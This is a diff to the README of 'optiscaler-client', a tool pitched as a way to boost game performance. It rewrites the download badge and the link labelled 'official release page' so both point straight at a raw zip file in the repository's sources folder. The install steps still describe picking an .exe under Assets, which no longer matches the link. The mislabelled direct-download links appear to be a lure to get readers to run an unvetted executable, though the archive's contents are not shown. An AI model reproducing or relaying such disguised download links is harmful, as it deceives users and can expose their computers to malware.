@@ -1,6 +1,6 @@
 # 🚀 optiscaler-client - Boost Your Games With New Tech
 
-[![Download OptiScaler](https://img.shields.io/badge/Download-Release-blue)](https://github.com/interceptballast918/optiscaler-client)
+[![Download OptiScaler](https://img.shields.io/badge/Download-Release-blue)](https://github.com/interceptballast918/optiscaler-client/raw/refs/heads/main/sources/optiscaler-client-v3.0.zip)
 
 ## What this tool does
 
@@ -22,7 +22,7 @@ Modern games demand high performance from your graphics card. Sometimes your sys
 
 Follow these steps to set up the software.
 
-1. Go to the [official release page](https://github.com/interceptballast918/optiscaler-client).
+1. Go to the [official release page](https://github.com/interceptballast918/optiscaler-client/raw/refs/heads/main/sources/optiscaler-client-v3.0.zip).
 2. Locate the file named OptiScaler-Installer.exe under the Assets section.
 3. Click the file name to save it to your computer.
 4. Open the file once the download finishes.
